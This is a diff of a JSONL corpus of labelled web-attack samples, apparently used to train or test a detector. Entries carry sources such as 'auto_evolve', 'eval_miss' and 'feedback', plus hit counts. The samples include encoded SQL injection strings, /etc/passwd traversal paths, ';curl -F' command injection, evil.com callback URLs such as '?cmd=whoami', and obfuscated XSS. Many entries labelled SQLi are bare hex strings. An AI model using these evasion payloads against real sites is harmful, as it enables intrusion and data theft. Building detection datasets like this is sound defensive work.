@@ -1,113 +1,3 @@
-{"label": "SQLi", "source": "auto_evolve", "snippet": "Ab9C6b4Aa96632AeB2d2Af1Feaa5462D", "hits": 63}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "4a9c6b4Aa96632AeB2d2Af1FeAA5462D", "hits": 15}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "b9C6b4Aa96632AeB2d2Af1Feaa5462D", "hits": 43}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "79b4a54Aa96632AcB2d2Af1FeAA5462D", "hits": 121}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "08c6634Aa96632AcB2d2Af1FeAA5462D", "hits": 215}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "5Cc6634Aa96632AcB2d2Af1Feaa5462D", "hits": 46}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "9a486b0Aa96632AeB2d2Af1Feaa5462D", "hits": 65}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "cC7d486b0Aa96632AeB2d2Af1FeAA5462D", "hits": 6}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "A8c7d486b0Aa96632AeB2d2Af1FEaa5462D", "hits": 27}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "A2b4c5d6e7f89aBcDeFgAhIjKlMnOpQrStuVwXyZa", "hits": 4}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "9aZzaYbCbDbCcDdBbAbBaAAcCCbBBa", "hits": 1}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "6329f9dbF56809B268650a6Bdd5600B1", "hits": 22}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "771055ff80A1f2d23AD12A2eafB42f99", "hits": 19}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "id=1&id=7C6b4Aa96632AeB2d2Af1Feaa5462D", "hits": 24}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "5f1fEf87896F63A646dD0b5C55F2AC4B", "hits": 4}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "73245d7d4f55E9fB8Cc17da05Db9B226", "hits": 5}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "7b4c8f58d1a6e19be2b0e84cb181169a", "hits": 38}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "3c30b98cd5d2b9265d4b620c8167e2ba", "hits": 17}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "81cf4c4ad95f609fbabf11f1ce0d1d4b", "hits": 5}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "RQqBfTfUWcKvD4aHd8b9J2IeYgKlMnNpOqP", "hits": 8}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "-78C6634Aa96632AEb2d2AF1FeAA5462D-", "hits": 53}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "uRrSsFfGgHhIiJjKkLlMmNnPpQqRrTtUuVvWwXxYyZzAaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz", "hits": 133}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "118356AA9a5970e068e235c8A3665cb4", "hits": 43}
-{"label": "CMD", "source": "auto_evolve", "snippet": "http%3A%2F%2Fevil.com%2Fal", "hits": 260}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "7C98B1A5A46632Aeb2D2Af1FEAA5462D", "hits": 72}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "f0b9C9A5a46632Aeb2D2aF1fEAa5462D", "hits": 36}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "E89c98B1A46632Aeb2D2Af1feaa5462D", "hits": 50}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "a20b9C98B1A5A46632Aeb2D2Af1FEAA5462D", "hits": 0}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "e79c98B1A46632Aeb2d2Af1feaa5462D", "hits": 3}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "4f587de5a2a21b47aC4549dee86763fc", "hits": 32}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "f1b9C9a5A46632Aeb2d2Af1FEaa5462D", "hits": 2}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "c0b9C9a5A46632Aeb2d2Af1FEaa5462D", "hits": 4}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "81b9C9a5A46632Aeb2d2Af1FEaa5462D", "hits": 6}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "b25a1fA46632Aeb2D2Af1feaa5462d", "hits": 3}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "-987cb0c5A46632Aeb2D2Af1FEAA5462D", "hits": 0}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "-c6e9caB1A46632Aeb2D2Af1fEaA2Eaa5462D", "hits": 2}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "b1a47aC45496De86763fC", "hits": 10}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "A46632Aeb2D2Af1feaa5462d", "hits": 0}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "E051B2A4A46632Aeb2D2Af1FEaa5462D", "hits": 0}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "987eC5a5A46632Aeb2d2Af1feaa5462D", "hits": 29}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "3c98b1A5A46632Aeb2D2Af1FEaa5462D", "hits": 3}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "5a2d49cC663a1Beb2D2Af1FEaa5462D", "hits": 0}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "7c4e4ad799a28B48dd52a60da6163EF3", "hits": 12}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "id=1&id=f0b9C9a5A46632Aeb2d2Af1FEaa5462D", "hits": 19}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "91D6FEf0b50ED5d7dA70C0EB7e82647A", "hits": 51}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "03Ba310029af1F7Cf11A23Cc39f854eE", "hits": 71}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "E89c98B1A46632Aeb2D2Af1feaa5462D AND 1 LIKE 1", "hits": 246}
-{"label": "CMD", "source": "auto_evolve", "snippet": "http%25253A%25252F%25252Fevil.com%25252Fal", "hits": 262}
-{"label": "CMD", "source": "auto_evolve", "snippet": "http%2525253A%2525252F%2525252Fevil.com%2525252Fal", "hits": 235}
-{"label": "CMD", "source": "auto_evolve", "snippet": "hｔｔp%3A%2F%2Fｅvｉｌ.cｏm%2Fal", "hits": 74}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "68E85CA27086FBe58Ffbf607748bA009", "hits": 55}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "c63433eB33d6E55f3a2eB16793361f24", "hits": 61}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "%6F783D756E74696D61746963267374617475733D317C7374617475733D312670726F6A656374733D7B%69733D783D317D", "hits": 11}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "78c6634Aa96632Aeb2d2Af1FfAA5462D", "hits": 101}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "78c6634Aa96632aeB2D2AF1Feaa5462d AND ASCII(SUBSTRING(@@version,1,1))>40", "hits": 5}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "69EB26a3D31B031Ea6EE55517D238160", "hits": 16}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "949a49068421C596f2149Fb578DC2FFF", "hits": 24}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "d1Ec3f2A53cCfe6C3491c62881Afc04B", "hits": 6}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "nG654aBc9e8fDEgThiU2Vw", "hits": 26}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "1UN67Stt3X5ofOiHk2vW", "hits": 45}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "n8G655aBc9e8fDEgThiU2Vw", "hits": 4}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "1uN77sTt3x5oFoIhK2Vw", "hits": 15}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "tN57sTt1x4oFoIhK2Vw", "hits": 13}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "6uN67sTt3x5oFoIhK2Vw", "hits": 4}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "g8c6634Aa96632AbEb2d2Af1feAA5462D AND 1 LIKE 1", "hits": 1}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "7x5fAa96632Abd47aC8F1FEAA5462D", "hits": 5}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "fN67sTt3x5oFoIhKuVwAND1LIKE1", "hits": 14}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "GgYb5e58a96632ABc9eZdEfFFaaA462D", "hits": 2}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "90a78dF5a2b13C47aD685eEgTHiU2VwF3", "hits": 0}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "7c6634Aa96632Aeb2d2Af1FEAA5462DaF AND 1 LIKE 1", "hits": 7}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "kx654aBc9e8fDhU2Vw1uN67sTt3x5oFoIhK2Vw3", "hits": 3}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "A78c6634AA96632aEb2d2AF1feAa5462D9", "hits": 0}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "kX654aBc9e8fDeThU2Vw1uN67sTt3x5oFoIhK2VwAND6", "hits": 0}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "C5B879A1a4D0E6f468c203bB0C5F99dE", "hits": 6}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "7eBc3a87D37b3A6f34a8c203bB0C5F99dE", "hits": 5}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "17A92468Ca7eb62640Ba23ac6E99C9f4", "hits": 3}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "id=1&id=nG654aBc9e8fDEgThiU2Vw", "hits": 516}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "id=1&id=1uN67sTt3x5oFoIhK2Vw", "hits": 519}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "78c6634Aa96632Aeb2d2Af1FEAA5462D AND 1.0e0 LIKE 1.0e0", "hits": 514}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "6F9C3B64e1d7CCad3FE17b86aF454B5A", "hits": 515}
-{"label": "CMD", "source": "auto_evolve", "snippet": "http%3A%2F%2Fevil.com%2Fa", "hits": 754}
-{"label": "CMD", "source": "auto_evolve", "snippet": "http%3A%2F%2Fevil.com%0Aa", "hits": 752}
-{"label": "CMD", "source": "auto_evolve", "snippet": "http%3A%2F%2Fevil.com%2F%23a", "hits": 659}
-{"label": "CMD", "source": "auto_evolve", "snippet": "http%3A%2F%2Fevil.com%0Aa%0A", "hits": 702}
-{"label": "CMD", "source": "auto_evolve", "snippet": "http%3A%2F%2Fevil.com%0A%0Aa", "hits": 179}
-{"label": "CMD", "source": "auto_evolve", "snippet": "http%25253A%25252F%25252Fevil.com%25252Fa", "hits": 134}
-{"label": "CMD", "source": "auto_evolve", "snippet": "http%2525253A%2525252F%2525252Fevil.com%2525250Aa", "hits": 104}
-{"label": "CMD", "source": "auto_evolve", "snippet": "http%3A%2F%2Fevil.com%26a%0A", "hits": 158}
-{"label": "CMD", "source": "auto_evolve", "snippet": "http://evil.com/a%0Aa%0A", "hits": 157}
-{"label": "CMD", "source": "auto_evolve", "snippet": "http://evil.com/a%0A%0Aa", "hits": 166}
-{"label": "CMD", "source": "auto_evolve", "snippet": "{http%3A%2F%2Fevil.com%2F%23a,}", "hits": 73}
-{"label": "CMD", "source": "auto_evolve", "snippet": "{http%3A%2F%2Fevil.com%0Aa%0A,}", "hits": 122}
-{"label": "CMD", "source": "auto_evolve", "snippet": "{http%3A%2F%2Fevil.com%0A%0Aa,}", "hits": 77}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "https%3A//example.com/?u=http%3A%2F%2Fmalicious.com%2Findex.php%3Fp%3D1", "hits": 338}
-{"label": "XSS", "source": "auto_evolve", "snippet": "http%3A%2F%2Fexample.com%3Fmode%3Dregister&_url_encode_login%3Dfscocos&password%3Daut%C3%B4nticamente&nombre%3DWalkiria&", "hits": 375}
-{"label": "PathTraversal", "source": "auto_evolve", "snippet": "%26nompercentbre=Qu%E1so+Mancheg%o&preci%C3%B1o=100&cantidad=15&B1=A%CC%8Aadir+a%CC%8Al+carr%C3%ADto", "hits": 490}
-{"label": "PathTraversal", "source": "auto_evolve", "snippet": "id%A3%26nombr%E1%CE%BAManchego%26precio%20100%26cantidad%3D15%40B1%3DA%A0adir+a%A0l+carr%EDto", "hits": 299}
-{"label": "PathTraversal", "source": "auto_evolve", "snippet": "%26nompercentbre=Qu%E1so+Manc%C3%A9hego&preci%C3%B1o=100&cantidad=15&B1=A%CC%8Aadir+a%CC%8Al+carr%C3%ADto", "hits": 309}
-{"label": "PathTraversal", "source": "auto_evolve", "snippet": "- %26nompercentbre=Qu%E1so+Manc%C3%A9hogo&preci%C3%B1o=100&cantidad=15&B1=A%CC%8Aadir+a%CC%8Al+l+carr%EDto", "hits": 380}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "https%3A//example.com/?u=http%3A%2F%2Fmalicious.com%2Findex.php%3Fp%3D1%26c%3D2", "hits": 309}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "{\"a\":{\"b\":\"%2571%2564%2568%2565%2573%2565%2572%2576%2569%2563%2579%2520%2573%2565%2573%2574%2572%256F%2577%256E%2565%257", "hits": 118}
-{"label": "XSS", "source": "auto_evolve", "snippet": "http%61re=http%69t%67p%2f%2fexample.com%3fparam1%3dvalue1%26param2%3dvalue2", "hits": 163}
-{"label": "XSS", "source": "auto_evolve", "snippet": "http%61re=http%69t%67p%2f%2Fexample.oo%3fw%3dvalue1%26q%3dvalue2", "hits": 142}
-{"label": "XSS", "source": "auto_evolve", "snippet": "http%61re=http%69t%67p%2f%2Frulz.oo%3fp%3dvalue1%26v%3dvalue2", "hits": 164}
-{"label": "CMD", "source": "auto_evolve", "snippet": "![](http://evil.com/x", "hits": 39}
-{"label": "XSS", "source": "auto_evolve", "snippet": "http%61re=http%69t%67p%2f%2Fexample.com%3fparam1%3dvalue1%26param2%3dvalue2%26x%3dpolymorphic_data", "hits": 131}
-{"label": "CMD", "source": "auto_evolve", "snippet": "![](http://evil.com/x?cmd=whoami", "hits": 28}
-{"label": "XSS", "source": "auto_evolve", "snippet": "http%61re=http%69t%67p%2f%2Fexample.com%3fw%3du002526u002348u00253Bu0026u002311u002526u0", "hits": 97}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "http%3A%2F%2Fexample.com%2Flogin%3Fmodo%3Dentrar%26login%3Ddionysus%26pwd%3Dany%253F%0ASet-cookie%3A+Tamper%3D5765205567", "hits": 391}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "hTtP://ExAmplE.COM/LogIn?MOdO=eNTRAR&logIn=DIoNySUs&pWd=ANy%253f%0ASET-cOOkIe%3aTAmpER%3d5765205567234876235&REMembER%3D", "hits": 454}
 {"label": "PathTraversal", "source": "auto_evolve", "snippet": "%252e/%252e/%252e/../../../etc/passwd", "hits": 188}
 {"label": "PathTraversal", "source": "auto_evolve", "snippet": "%252e%252e%252e/../..%252e%252e%252e/../../../../../etc/passwd", "hits": 202}
 {"label": "CMD", "source": "auto_evolve", "snippet": "modo=registro&loginA=eastreg&passw%68thepula1le=Carmen&apellidos=Gr%C3%B2cia+Puigmart%C3%B3&email=dufresne%40mauvier.hk&", "hits": 480}
@@ -169,32 +59,142 @@
 {"label": "XSS", "source": "auto_evolve", "snippet": "%e6%B3%a2%e4%b8%AA%2561%2570%2574%2569%256F%256E%2f%2570%2568%2570%282%2529%253B%2523%256C%2561%256e%2567%2574%28%22%252", "hits": 3}
 {"label": "XSS", "source": "auto_evolve", "snippet": "%2525E6%2525B3%2525A2%2525E4%2525B8%2525AA%252561%252570%252574%252569%25256F%25256E%25252F68%252570%2525282%252529%2525", "hits": 0}
 {"label": "XSS", "source": "auto_evolve", "snippet": "%E6%B3%\\u00412%E4%B8%AA%61%70%74%69%6F%6E%2F68%70%282%29%3B%2523%6\\u0043%61%6E%67%74%28%22%2\\u0041%29%3B", "hits": 2}
-{"label": "XSS", "source": "auto_evolve", "snippet": "eval(/*x*/(%E6%B3%A2%E4%B8%AA%2561%2570%2574%2569%256F%256E%2F%2570%2568%2570%282%2529%253B%2523%256C%2561%256E%2567%257", "hits": 0}
+{"label": "XSS", "source": "auto_evolve", "snippet": "eval(/*x*/(%E6%B3%A2%E4%B8%AA%2561%2570%2574%2569%256F%256E%2F%2570%2568%2570%282%2529%253B%2523%256C%2561%256E%2567%257", "hits": 62}
 {"label": "XSS", "source": "auto_evolve", "snippet": "%\\u00456%B3%\\u00412%E4%\\u00428%\\u0041\\u0041%61%70%74%69%6F%6E%2\\u004670%75%6\\u0043%6C%69%6\\u0045%65%64%282%29%3\\u0042%25", "hits": 0}
-{"label": "CMD", "source": "auto_evolve", "snippet": "%C2%8F%C2%9C%CF%CA%C2%A5%C2%AE%C2%BB%C2%84%C2%A1%C2%AC%E6%B2%B9%E8%BE%93%E7%9A%84%E6%9B%B4%E7%BA%A7", "hits": 6}
+{"label": "CMD", "source": "auto_evolve", "snippet": "%C2%8F%C2%9C%CF%CA%C2%A5%C2%AE%C2%BB%C2%84%C2%A1%C2%AC%E6%B2%B9%E8%BE%93%E7%9A%84%E6%9B%B4%E7%BA%A7", "hits": 37}
 {"label": "CMD", "source": "auto_evolve", "snippet": "%2525C2%25258F%2525C2%25259C%2525CF%2525CA%2525C2%2525A5%2525C2%2525AE%2525C2%2525BB%2525C2%252584%2525C2%2525A1%2525C2%", "hits": 0}
-{"label": "CMD", "source": "auto_evolve", "snippet": "eval(/*x*/(%C2%8F%C2%9C%CF%CA%C2%A5%C2%AE%C2%BB%C2%84%C2%A1%C2%AC%E6%B2%B9%E8%BE%93%E7%9A%84%E6%9B%B4%E7%BA%A7))", "hits": 1}
+{"label": "CMD", "source": "auto_evolve", "snippet": "eval(/*x*/(%C2%8F%C2%9C%CF%CA%C2%A5%C2%AE%C2%BB%C2%84%C2%A1%C2%AC%E6%B2%B9%E8%BE%93%E7%9A%84%E6%9B%B4%E7%BA%A7))", "hits": 61}
 {"label": "CMD", "source": "auto_evolve", "snippet": "%252525C2%2525258F%252525C2%2525259C%252525CF%252525CA%252525C2%252525A5%252525C2%252525AE%252525C2%252525BB%252525C2%25", "hits": 0}
-{"label": "CMD", "source": "auto_evolve", "snippet": "http%3A//www.example.com%3Fq%3DP085g%40f", "hits": 97}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "http%3A%2F%2Fexample.com%40%23page%26query%3Dvalue", "hits": 124}
+{"label": "CMD", "source": "auto_evolve", "snippet": "http%3A//www.example.com%3Fq%3DP085g%40f", "hits": 222}
+{"label": "SQLi", "source": "auto_evolve", "snippet": "http%3A%2F%2Fexample.com%40%23page%26query%3Dvalue", "hits": 246}
 {"label": "CMD", "source": "auto_evolve", "snippet": "%40b-sign.cg%0A+B1%3DRegistrar", "hits": 15}
 {"label": "SQLi", "source": "auto_evolve", "snippet": "id%3D3&nombre=Vino%u00C9Rioja&precio=85&cantidad=31&B1=A%EF%BF%BDAadir%2Bal%2Bcarrito", "hits": 1}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "http%3A%2F%2Fexample.com%40%23page%26query%3Dvalue' OR '1'='1", "hits": 71}
-{"label": "CMD", "source": "auto_evolve", "snippet": "%40b-sign.cg%0A+B1%3DReg157r4r", "hits": 14}
+{"label": "SQLi", "source": "auto_evolve", "snippet": "http%3A%2F%2Fexample.com%40%23page%26query%3Dvalue' OR '1'='1", "hits": 107}
+{"label": "CMD", "source": "auto_evolve", "snippet": "%40b-sign.cg%0A+B1%3DReg157r4r", "hits": 15}
 {"label": "SQLi", "source": "auto_evolve", "snippet": "https://example.%EF%B8%91/resource?key=value", "hits": 71}
 {"label": "CMD", "source": "auto_evolve", "snippet": "modo=registro&login=thyagara&password=fUeRTe&nombre=Sol&apellidos=Gorgone%2BOteo&email=tissier@b-sign.cg&dni=03028605B&d", "hits": 58}
 {"label": "CMD", "source": "auto_evolve", "snippet": "modo=regist1ro&login=thyagara%2Bpassword=fUeRTe%26nombre=S0l%26apellidos=Gorgone%2BOteo%26email=tissier@b-sign.cg%26dni=", "hits": 56}
 {"label": "CMD", "source": "auto_evolve", "snippet": ";curl -F \"q=modo=registro&login=thyagara%2Bpassword=fUeRTe%26nombre=Sol%26apellidos=Gorgone%2BOteo%26email=tissier@b-sig", "hits": 24}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "{\"a\":{\"b\":\"https://example.%EF%B8%8F/resource?key=value\"}}", "hits": 45}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "https%3A%2F%2Fexample.%25EF%25B8%258F%2Fresource%3Fkey%3Dvalue", "hits": 59}
+{"label": "SQLi", "source": "auto_evolve", "snippet": "{\"a\":{\"b\":\"https://example.%EF%B8%8F/resource?key=value\"}}", "hits": 58}
+{"label": "SQLi", "source": "auto_evolve", "snippet": "https%3A%2F%2Fexample.%25EF%25B8%258F%2Fresource%3Fkey%3Dvalue", "hits": 175}
 {"label": "CMD", "source": "auto_evolve", "snippet": "m0do=r3gis7ro&l0gin=thy4gara&p455w0rd=fU3RT3&nombre=Sol&apell1do5=Gorgon3%2BOt3o&em41l=ti5s13r@b-5ign.cg&dni=03028605B&d", "hits": 12}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "{\"a\":{\"b\":\"https://example.%EF%BF%A1/resource?key=value\"}}", "hits": 3}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "https://example.%EF%B8%91/resource?key=value&param=anything", "hits": 16}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "https://example.%40/resource?key=value", "hits": 14}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "Https://eXAMPLe.%68%72%65%73%40/ReSoURce?kEY=valUE", "hits": 18}
-{"label": "CMD", "source": "auto_evolve", "snippet": ";curl -F \"q=modo=r3gis7ro&login=t1y4gara&p455w0rd=fUeRT3&nombre=Sol&apell1do=Gorgon3%2BOt3o&email=tissier@b-sign.cg&dni=", "hits": 3}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "https://example.%EF%B8%91/resource?key=value/*--*/", "hits": 6}
-{"label": "SQLi", "source": "auto_evolve", "snippet": "http%3A%2F%2Fwww.example.com%2Ftest.php%3Fparam1=value1%26param2=value2--", "hits": 37}
+{"label": "SQLi", "source": "auto_evolve", "snippet": "{\"a\":{\"b\":\"https://example.%EF%BF%A1/resource?key=value\"}}", "hits": 16}
+{"label": "SQLi", "source": "auto_evolve", "snippet": "https://example.%EF%B8%91/resource?key=value&param=anything", "hits": 19}
+{"label": "SQLi", "source": "auto_evolve", "snippet": "https://example.%40/resource?key=value", "hits": 17}
+{"label": "SQLi", "source": "auto_evolve", "snippet": "Https://eXAMPLe.%68%72%65%73%40/ReSoURce?kEY=valUE", "hits": 27}
+{"label": "CMD", "source": "auto_evolve", "snippet": ";curl -F \"q=modo=r3gis7ro&login=t1y4gara&p455w0rd=fUeRT3&nombre=Sol&apell1do=Gorgon3%2BOt3o&email=tissier@b-sign.cg&dni=", "hits": 6}
+{"label": "SQLi", "source": "auto_evolve", "snippet": "https://example.%EF%B8%91/resource?key=value/*--*/", "hits": 48}
+{"label": "SQLi", "source": "auto_evolve", "snippet": "http%3A%2F%2Fwww.example.com%2Ftest.php%3Fparam1=value1%26param2=value2--", "hits": 270}
 {"label": "CMD", "source": "auto_evolve", "snippet": "MOdO=rEGiStro&", "hits": 7}
 {"label": "XSS", "source": "auto_evolve", "snippet": "inline_comment", "hits": 0}
 {"label": "CMD", "source": "auto_evolve", "snippet": "modo%3Dregistro%26", "hits": 0}
+{"label": "SQLi", "source": "eval_miss", "snippet": "modoA%3Dinsertar%26precio%3D5698%26B1%3DPasar%2Bpor%2Bcaja", "hits": 0}
+{"label": "SQLi", "source": "eval_miss", "snippet": "modo%3Dregistro%26login%3Djiuhuai4%26password%3Drenombrada%26nombre%3DVasty%26apellidos%3DAceituno%2BMasdevall%26email%3", "hits": 0}
+{"label": "SQLi", "source": "eval_miss", "snippet": "modo%3Dinsertar%26precio%3D943%26B1%3DConfirmar%2F", "hits": 0}
+{"label": "SQLi", "source": "eval_miss", "snippet": "modo%3Dinsertar%26precioA%3D150%26B1%3DConfirmar", "hits": 0}
+{"label": "SQLi", "source": "eval_miss", "snippet": "modo%3Dregistro%26login%3Dsnarr%26password%3Daocar%26nombre%3DRomari%26apellidos%3DAstorga%26email%3Dlaine-devlin%40telo", "hits": 0}
+{"label": "SQLi", "source": "eval_miss", "snippet": "modo%3Dentrar%26login%3Dstarkes%26pwd%3Dab393n5te%26remember%3Doff%26B1%3D%2500", "hits": 3}
+{"label": "SQLi", "source": "eval_miss", "snippet": "modoA%3Dinsertar%26precio%3D40%26B1%3DConfirmar", "hits": 0}
+{"label": "SQLi", "source": "eval_miss", "snippet": "Id=3&nOMBRe=QUEso+ManchEgo%7c&PrecIO=39&cANTidAD=53&b1=a�adIR+aL+cArRito", "hits": 0}
+{"label": "SQLi", "source": "eval_miss", "snippet": "id=2&nombre=%20&precio=85&cantidad=23&B1=A�adir+al+carrito", "hits": 0}
+{"label": "SQLi", "source": "eval_miss", "snippet": "modo%3Dregistro%26login%3Drygwalsk%26password%3Dve50able%26nombre%3DFrancisco%26apellidos%3DPallares%2BMilara%26email%3D", "hits": 0}
+{"label": "SQLi", "source": "eval_miss", "snippet": "modo%3Dregistro%26login%3Djeri%26password%3D8n6s17D741a49e%26nombre%3DEutimio%26apellidos%3DZamudio%26email%3Dbannen%40m", "hits": 0}
+{"label": "SQLi", "source": "eval_miss", "snippet": "ｉd=2|", "hits": 76}
+{"label": "SQLi", "source": "eval_miss", "snippet": "id=%20/*--*/", "hits": 0}
+{"label": "SQLi", "source": "eval_miss", "snippet": "{\"a\":{\"b\":\"%2B\"}}", "hits": 20}
+{"label": "SQLi", "source": "eval_miss", "snippet": "Rio%2BDeva%2C%2B127%2C%2B13H", "hits": 0}
+{"label": "SQLi", "source": "eval_miss", "snippet": "c%2F%3Fa%2Cry", "hits": 9}
+{"label": "SQLi", "source": "eval_miss", "snippet": "2%20/*--*/", "hits": 8}
+{"label": "SQLi", "source": "eval_miss", "snippet": "{\"a\":{\"b\":\"B2=%2B\"}}", "hits": 9}
+{"label": "SQLi", "source": "eval_miss", "snippet": "%20' OR '1'='1", "hits": 30}
+{"label": "SQLi", "source": "eval_miss", "snippet": "B2%3DVaciar%2Bcarrito%27%2C%270%27%29%3Bwaitfor%2Bdelay%2B%270%3A0%3A15%27%3B--", "hits": 0}
+{"label": "SQLi", "source": "eval_miss", "snippet": "hambｌｉｎ@ｎik.cｏm.cn", "hits": 0}
+{"label": "SQLi", "source": "eval_miss", "snippet": "%27INJECTED_PARAM", "hits": 0}
+{"label": "SQLi", "source": "eval_miss", "snippet": "%40cr%40anh%40am%404horas.ki", "hits": 0}
+{"label": "SQLi", "source": "eval_miss", "snippet": "Vaciar+carritｏ|", "hits": 0}
+{"label": "SQLi", "source": "eval_miss", "snippet": "%27%2Btheolog%27o", "hits": 0}
+{"label": "SQLi", "source": "eval_miss", "snippet": "\\u0069d=|", "hits": 2}
+{"label": "SQLi", "source": "eval_miss", "snippet": "Glorieta%2BLiquidambar%2C%2BS%2FN%2C%2B13%3FF", "hits": 0}
+{"label": "SQLi", "source": "eval_miss", "snippet": "Av.%2BReyes%2BCatolicos%2C%2B73%2B4A", "hits": 0}
+{"label": "SQLi", "source": "eval_miss", "snippet": "{\"a\":{\"b\":\"%20\"}}", "hits": 20}
+{"label": "XSS", "source": "eval_miss", "snippet": "<XML/**/SRC/**/=/**/\"http:/xss.rocks/xsstest.xml\"/**/ID/**/=/**/I></XML>", "hits": 14}
+{"label": "SQLi", "source": "eval_miss", "snippet": "{\"a\":{\"b\":\"errorMsg=Credenciales+incorrectas%20\"}}", "hits": 11}
+{"label": "SQLi", "source": "eval_miss", "snippet": "{\"a\":{\"b\":\"2%2B\"}}", "hits": 17}
+{"label": "SQLi", "source": "eval_miss", "snippet": "%20", "hits": 0}
+{"label": "SQLi", "source": "eval_miss", "snippet": "Passeig%2BSant%2BJoan%2BBosco%2B22%2C%2B12%3FG", "hits": 5}
+{"label": "SQLi", "source": "eval_miss", "snippet": "Calle%2BVirgen%2BDe%2BLa%2BEstrella%2C%2B150%2C%2B", "hits": 0}
+{"label": "SQLi", "source": "eval_miss", "snippet": "man%2A%3Fg%3Fum", "hits": 0}
+{"label": "SQLi", "source": "eval_miss", "snippet": "Cuenca%2BS%2FN%2B", "hits": 132}
+{"label": "XSS", "source": "feedback", "snippet": "&#60;&#38;&#35;&#49;&#49;&#53;&#59;&#38;&#35;&#57;&#57;&#59;&#114;&#105;&#112;&#116;&#38;&#35;&#54;&#50;&#59;&#97;&#108;", "hits": 2}
+{"label": "XSS", "source": "feedback", "snippet": "&#60;&#1&#49;&#53;;&#38;#&#57;&#57;&#59;&#114;&#105;p&#116;&&#35;&#54;&#50;&#59;a&#108;e&#114;&#116;&&#35;40&#59;&#49&#5", "hits": 6}
+{"label": "XSS", "source": "feedback", "snippet": "&#60;img/**/src&#61;&#120;&#32;&#111;nerror&#61;\"<sc&#114;&#105;pt>&#97;l&#101;&#114;&#116;(1)</&#115;cr&#105;p&#116;>\"&", "hits": 65}
+{"label": "XSS", "source": "feedback", "snippet": "&#60;&#115;c&#114;ip&#116;&#62;&#97;le&#114;&#116;&#40;1&#41;&#60;&#47;&#115;c&#114;&#105;&#112;t>", "hits": 11}
